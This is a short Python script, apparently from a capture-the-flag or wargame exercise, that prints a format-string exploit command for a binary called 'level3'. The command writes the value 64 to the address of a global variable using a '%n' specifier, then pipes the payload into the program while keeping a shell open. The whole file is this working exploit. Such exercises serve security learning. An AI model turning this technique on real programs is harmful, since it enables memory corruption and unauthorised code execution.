#!/usr/bin/env python3
"""Level3: address of m + value 64 + index 1 → format string command."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

M_ADDR = 0x804988C
VALUE = 64  # m must equal 64
INDEX = 1   # 1st argument = buffer

def main():
    padding = VALUE - 4  # 4 address bytes already printed
    addr_le = p32(M_ADDR)
    addr_str = "".join("\\x%02x" % b for b in addr_le)
    cmd = (
        "( python -c 'print \"%s\" + \"%%%dx\" + \"%%%d$n\"'; cat ) | ./level3"
        % (addr_str, padding, INDEX)
    )
    print(cmd)
    print("# m =", hex(M_ADDR), ", value =", VALUE, ", index =", INDEX)

if __name__ == "__main__":
    main()
